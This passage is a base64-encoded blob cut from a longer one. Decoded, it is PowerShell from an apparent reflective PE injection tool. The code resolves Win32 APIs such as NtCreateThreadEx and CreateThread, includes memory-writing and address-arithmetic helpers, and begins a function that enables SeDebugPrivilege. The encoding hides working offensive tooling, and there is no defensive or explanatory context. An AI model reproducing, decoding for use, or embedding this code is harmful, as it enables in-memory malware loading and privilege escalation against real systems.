Wx1ZURlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExvb2t1cFByaXZpbGVnZVZhbHVlIC1WYWx1ZSAkTG9va3VwUHJpdmlsZWdlVmFsdWUKCQkKCQkkSW1wZXJzb25hdGVTZWxmQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgSW1wZXJzb25hdGVTZWxmCiAgICAgICAgJEltcGVyc29uYXRlU2VsZkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJEltcGVyc29uYXRlU2VsZiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJbXBlcnNvbmF0ZVNlbGZBZGRyLCAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUpCgkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSW1wZXJzb25hdGVTZWxmIC1WYWx1ZSAkSW1wZXJzb25hdGVTZWxmCgkJCgkJJE50Q3JlYXRlVGhyZWFkRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIE50RGxsLmRsbCBOdENyZWF0ZVRocmVhZEV4CiAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0Jvb2xdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtVSW50MzJdKQogICAgICAgICROdENyZWF0ZVRocmVhZEV4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE50Q3JlYXRlVGhyZWFkRXhBZGRyLCAkTnRDcmVhdGVUaHJlYWRFeERlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50Q3JlYXRlVGhyZWFkRXggLVZhbHVlICROdENyZWF0ZVRocmVhZEV4CgkJCgkJJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBLZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MKICAgICAgICAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJc1dvdzY0UHJvY2VzcyAtVmFsdWUgJElzV293NjRQcm9jZXNzCgkJCgkJJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgS2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIENyZWF0ZVRocmVhZCAtVmFsdWUgJENyZWF0ZVRocmVhZAoJCQoJCXJldHVybiAkV2luMzJGdW5jdGlvbnMKCX0KCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgkJCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJIyMjIyMjIyMjIyMgICAgSEVMUEVSUyAgICMjIyMjIyMjIyMjIwoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCSNQb3dlcnNoZWxsIG9ubHkgZG9lcyBzaWduZWQgYXJpdGhtZXRpYywgc28gaWYgd2Ugd2FudCB0byBjYWxjdWxhdGUgbWVtb3J5IGFkZHJlc3NlcyB3ZSBoYXZlIHRvIHVzZSB0aGlzIGZ1bmN0aW9uCgkjVGhpcyB3aWxsIGFkZCBzaWduZWQgaW50ZWdlcnMgYXMgaWYgdGhleSB3ZXJlIHVuc2lnbmVkIGludGVnZXJzIHNvIHdlIGNhbiBhY2N1cmF0ZWx5IGNhbGN1bGF0ZSBtZW1vcnkgYWRkcmVzc2VzCglGdW5jdGlvbiBTdWItU2lnbmVkSW50QXNVbnNpZ25lZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTEsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50NjRdCgkJJFZhbHVlMgoJCSkKCQkKCQlbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQoJCVtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCgkJW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgoJCWlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKCQl7CgkJCSRDYXJyeU92ZXIgPSAwCgkJCWZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQoJCQl7CgkJCQkkVmFsID0gJFZhbHVlMUJ5dGVzWyRpXSAtICRDYXJyeU92ZXIKCQkJCSNTdWIgYnl0ZXMKCQkJCWlmICgkVmFsIC1sdCAkVmFsdWUyQnl0ZXNbJGldKQoJCQkJewoJCQkJCSRWYWwgKz0gMjU2CgkJCQkJJENhcnJ5T3ZlciA9IDEKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkQ2FycnlPdmVyID0gMAoJCQkJfQoJCQkJCgkJCQkKCQkJCVtVSW50MTZdJFN1bSA9ICRWYWwgLSAkVmFsdWUyQnl0ZXNbJGldCgoJCQkJJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkYKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlUaHJvdyAiQ2Fubm90IHN1YnRyYWN0IGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgoJCX0KCQkKCQlyZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCgl9CgkKCglGdW5jdGlvbiBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTEsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50NjRdCgkJJFZhbHVlMgoJCSkKCQkKCQlbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQoJCVtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCgkJW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgoJCWlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKCQl7CgkJCSRDYXJyeU92ZXIgPSAwCgkJCWZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQoJCQl7CgkJCQkjQWRkIGJ5dGVzCgkJCQlbVUludDE2XSRTdW0gPSAkVmFsdWUxQnl0ZXNbJGldICsgJFZhbHVlMkJ5dGVzWyRpXSArICRDYXJyeU92ZXIKCgkJCQkkRmluYWxCeXRlc1skaV0gPSAkU3VtIC1iYW5kIDB4MDBGRgoJCQkJCgkJCQlpZiAoKCRTdW0gLWJhbmQgMHhGRjAwKSAtZXEgMHgxMDApCgkJCQl7CgkJCQkJJENhcnJ5T3ZlciA9IDEKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkQ2FycnlPdmVyID0gMAoJCQkJfQoJCQl9CgkJfQoJCWVsc2UKCQl7CgkJCVRocm93ICJDYW5ub3QgYWRkIGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgoJCX0KCQkKCQlyZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCgl9CgkKCglGdW5jdGlvbiBDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnQ2NF0KCQkkVmFsdWUxLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTIKCQkpCgkJCgkJW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKCQlbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQoKCQlpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCgkJewoJCQlmb3IgKCRpID0gJFZhbHVlMUJ5dGVzLkNvdW50LTE7ICRpIC1nZSAwOyAkaS0tKQoJCQl7CgkJCQlpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtZ3QgJFZhbHVlMkJ5dGVzWyRpXSkKCQkJCXsKCQkJCQlyZXR1cm4gJHRydWUKCQkJCX0KCQkJCWVsc2VpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtbHQgJFZhbHVlMkJ5dGVzWyRpXSkKCQkJCXsKCQkJCQlyZXR1cm4gJGZhbHNlCgkJCQl9CgkJCX0KCQl9CgkJZWxzZQoJCXsKCQkJVGhyb3cgIkNhbm5vdCBjb21wYXJlIGJ5dGUgYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplIgoJCX0KCQkKCQlyZXR1cm4gJGZhbHNlCgl9CgkKCglGdW5jdGlvbiBDb252ZXJ0LVVJbnRUb0ludAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1VJbnQ2NF0KCQkkVmFsdWUKCQkpCgkJCgkJW0J5dGVbXV0kVmFsdWVCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUpCgkJcmV0dXJuIChbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkVmFsdWVCeXRlcywgMCkpCgl9CgoKICAgIEZ1bmN0aW9uIEdldC1IZXgKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgICRWYWx1ZSAjV2Ugd2lsbCBkZXRlcm1pbmUgdGhlIHR5cGUgZHluYW1pY2FsbHkKICAgICAgICApCgogICAgICAgICRWYWx1ZVNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFZhbHVlLkdldFR5cGUoKSkgKiAyCiAgICAgICAgJEhleCA9ICIweHswOlgkKCRWYWx1ZVNpemUpfSIgLWYgW0ludDY0XSRWYWx1ZSAjUGFzc2luZyBhIEludFB0ciB0byB0aGlzIGRvZXNuJ3Qgd29yayB3ZWxsLiBDYXN0IHRvIEludDY0IGZpcnN0LgoKICAgICAgICByZXR1cm4gJEhleAogICAgfQoJCgkKCUZ1bmN0aW9uIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N0cmluZ10KCQkkRGVidWdTdHJpbmcsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkUEVJbmZvLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkU3RhcnRBZGRyZXNzLAoJCQoJCVtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJFbmRBZGRyZXNzIiwgUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkRW5kQWRkcmVzcywKCQkKCQlbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiU2l6ZSIsIFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnRQdHJdCgkJJFNpemUKCQkpCgkJCgkJW0ludFB0cl0kRmluYWxFbmRBZGRyZXNzID0gW0ludFB0cl06Olplcm8KCQlpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICJTaXplIikKCQl7CgkJCVtJbnRQdHJdJEZpbmFsRW5kQWRkcmVzcyA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkU3RhcnRBZGRyZXNzKSAoJFNpemUpKQoJCX0KCQllbHNlCgkJewoJCQkkRmluYWxFbmRBZGRyZXNzID0gJEVuZEFkZHJlc3MKCQl9CgkJCgkJJFBFRW5kQWRkcmVzcyA9ICRQRUluZm8uRW5kQWRkcmVzcwoJCQoJCWlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkUEVJbmZvLlBFSGFuZGxlKSAoJFN0YXJ0QWRkcmVzcykpIC1lcSAkdHJ1ZSkKCQl7CgkJCVRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IHNtYWxsZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIgoJCX0KCQlpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJEZpbmFsRW5kQWRkcmVzcykgKCRQRUVuZEFkZHJlc3MpKSAtZXEgJHRydWUpCgkJewoJCQlUaHJvdyAiVHJ5aW5nIHRvIHdyaXRlIHRvIG1lbW9yeSBncmVhdGVyIHRoYW4gYWxsb2NhdGVkIGFkZHJlc3MgcmFuZ2UuICREZWJ1Z1N0cmluZyIKCQl9Cgl9CgkKCQoJRnVuY3Rpb24gV3JpdGUtQnl0ZXNUb01lbW9yeQoJewoJCVBhcmFtKAoJCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQkJW0J5dGVbXV0KCQkJJEJ5dGVzLAoJCQkKCQkJW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJCVtJbnRQdHJdCgkJCSRNZW1vcnlBZGRyZXNzCgkJKQoJCgkJZm9yICgkT2Zmc2V0ID0gMDsgJE9mZnNldCAtbHQgJEJ5dGVzLkxlbmd0aDsgJE9mZnNldCsrKQoJCXsKCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRNZW1vcnlBZGRyZXNzLCAkT2Zmc2V0LCAkQnl0ZXNbJE9mZnNldF0pCgkJfQoJfQoJCgoJI0Z1bmN0aW9uIHdyaXR0ZW4gYnkgTWF0dCBHcmFlYmVyLCBUd2l0dGVyOiBAbWF0dGlmZXN0YXRpb24sIEJsb2c6IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwoJRnVuY3Rpb24gR2V0LURlbGVnYXRlVHlwZQoJewoJICAgIFBhcmFtCgkgICAgKAoJICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQoJICAgICAgICAKCSAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KCSAgICAgICAgW1R5cGVbXV0KCSAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAoJICAgICAgICAKCSAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCgkgICAgICAgIFtUeXBlXQoJICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQoJICAgICkKCgkgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCgkgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKCSAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCgkgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQoJICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCgkgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKCSAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSAgICAKCSAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJfQoKCgkjRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCglGdW5jdGlvbiBHZXQtUHJvY0FkZHJlc3MKCXsKCSAgICBQYXJhbQoJICAgICgKCSAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQoJICAgIAoJICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkgICAgICAgIFtTdHJpbmddCgkgICAgICAgICRNb2R1bGUsCgkgICAgICAgIAoJICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCgkgICAgICAgIFtTdHJpbmddCgkgICAgICAgICRQcm9jZWR1cmUKCSAgICApCgoJICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwoJICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CgkgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQoJICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKCSAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCgkgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKCSAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKCSAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAoJICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKCSAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKCSAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgoJICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgoJICAgIFdyaXRlLU91dHB1dCAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQoJfQoJCgkKCUZ1bmN0aW9uIEVuYWJsZS1TZURlYnVnUHJpdmlsZWdlCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJGdW5jdGlvbnMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cwoJCSkKCQkKCQlbSW50UHRyXSRUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0Q3VycmVudFRocmVhZC5JbnZva2UoKQoJCWlmICgkVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gZ2V0IHRoZSBoYW5kbGUgdG8gdGhlIGN1cnJlbnQgdGhyZWFkIgoJCX0KCQkKCQlbSW50UHRyXSRUaHJlYWRUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCgkJW0Jvb2xdJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJCXsKCQkJJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCQkJaWYgKCRFcnJvckNvZGUgLWVxICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikKCQkJewoJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5JbXBlcnNvbmF0ZVNlbGYuSW52b2tlKDMpCgkJCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJCQkJewoJCQkJCVRocm93ICJVbmFibGUgdG8gaW1wZXJzb25hdGUgc2VsZiIKCQkJCX0KCQkJCQoJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKCQkJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJCQl7CgkJCQkJVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIgoJCQkJfQoJCQl9CgkJCWVsc2UKCQkJewoJCQkJVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIEVycm9yIGNvZGU6ICRFcnJvckNvZGUiCgkJCX0KCQl9CgkJCgkJW0ludFB0cl0kUEx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpKQoJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuTG9va3VwUHJpdmlsZWdlVmFsdWUuSW52b2tlKCRudWxsLCAiU2VEZWJ1Z1ByaXZpbGVnZSIsICRQTHVpZCkKCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJCXsKCQkJVGhyb3cgIlVuYWJsZSB0byBjYWxsIExvb2t1cFByaXZpbGVnZVZhbHVlIgoJCX0KCgkJW1VJbnQzMl0kVG9rZW5Qcml2U2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKQoJCVtJbnRQdHJdJFRva2VuUHJpdmlsZWdlc01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5Qcml2U2l6ZSkKCQkkVG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuUHJpdmlsZWdlc01lbSwgW1R5cGVdJFdpbjMyVHlwZXMuVE9LRU5fUFJJVklMRUdFUykKCQkkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50I